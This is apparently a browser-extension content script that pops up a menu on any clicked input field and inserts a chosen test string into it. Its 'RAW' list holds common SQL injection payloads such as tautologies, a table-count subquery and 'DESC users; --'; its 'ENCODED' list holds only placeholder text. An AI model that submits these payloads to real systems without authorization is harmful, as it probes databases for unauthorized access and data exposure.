//Create array of payloads to be added, these should be SQL payloads
const IDS = {
    ID_MENU: "menu_frame",
    ID_PAYLOAD_TYPES: "payload_types",
    ID_TYPED_PAYLOADS: "typed_payloads",
    ID_BUTTON_CLOSE: "button_close",
};

const PAYLOAD_TYPES = {
    "RAW": "Raw",
    "ENCODED": "Encoded",
};

const TYPED_PAYLOADS = {
    "RAW": ["1 OR 1=1", "1\\' OR \\'1\\'=\\'1", "1\\'1", "1 EXEC XP_", "1 AND 1=1", "1\\' AND 1=(SELECT COUNT(*) FROM tablenames); --", "1 AND USER_NAME() = \\'dbo\\'", "\\\\\\'; DESC users; --"],
    "ENCODED": ["sdsddsd", "vgvhvhj", "vvjhwdbjhd"],
};

// TODO Understand how to use modules and import these vars in it
const Utils = {
    hide: function (HTMLElement) {
        HTMLElement.style.display = "none";
    },
    show: function (HTMLElement) {
        HTMLElement.style.display = "block";
    },
    isVisible: function (HTMLElement) {
        return HTMLElement.style.display !== "none";
    },
    isNotNull: function (HTMLElement) {
        return null !== HTMLElement;
    },
};

// TODO module
const Ui = {
    createMenu: function () {
        let menu = document.createElement("iframe");
        menu.id = IDS.ID_MENU;
        menu.src = browser.extension.getURL("menu/menu.html");
        menu.style = "display: block; position:absolute; top: 25%; left: 25%; width:50%; height:50%;";
        Utils.hide(menu);

        document.body.appendChild(menu);

        if (Utils.isNotNull(menu) && !Utils.isVisible(menu)) Utils.show(menu);

        menu.onload = function () {
            Ui.getButtonClose().onclick = function () {
                Utils.hide(Ui.getMenu());
            };


            let listReference = Ui.getPayloadTypesList();
            for (let payloadType of Object.values(PAYLOAD_TYPES)) {
                let listElement = document.createElement("div");
                listReference.appendChild(listElement);

                let button = document.createElement("button");
                listElement.appendChild(button);
                button.innerHTML = payloadType;

                button.onclick = function () {
                    Utils.hide(Ui.getPayloadTypesList());

                    for (let typedPayload of TYPED_PAYLOADS[payloadType.toUpperCase()]) {
                        let div = document.createElement("div");
                        let el = document.createElement("a");
                        el.innerHTML = typedPayload;
                        el.className = "payload";
                        el.onclick = function () {
                            lastInputPressed.value = this.innerHTML;
                        };

                        div.appendChild(el);
                        Ui.getTypedPayloadsList().appendChild(div);
                    }
                };
            }
        };

        return menu;
    },
    getMenu: function () {
        return document.getElementById(IDS.ID_MENU);
    },
    getButtonClose: function () {
        return this.getMenu().contentWindow.document.getElementById(IDS.ID_BUTTON_CLOSE);
    },
    getPayloadTypesList: function () {
        return this.getMenu().contentWindow.document.getElementById(IDS.ID_PAYLOAD_TYPES);
    },
    getTypedPayloadsList: function () {
        return this.getMenu().contentWindow.document.getElementById(IDS.ID_TYPED_PAYLOADS);
    },
};

var lastInputPressed;

function main() {
    let inputs = document.getElementsByTagName("INPUT");

    for (let input of inputs) {
        if ("INPUT" === input.tagName) {
            input.onclick = function () {
                // Update last input field pressed
                lastInputPressed = this;

                let menu = Ui.getMenu();

                // if menu was previously loaded, show it and return
                if (Utils.isNotNull(menu)) {
                    Utils.show(menu);
                    return;
                }

                // else create menu
                menu = Ui.createMenu();

                // show menu
                if (Utils.isNotNull(menu) && !Utils.isVisible(menu)) Utils.show(menu);
            }
        }
    }
}

//+------------+
//|***-MAIN-***|
//+------------+
main();
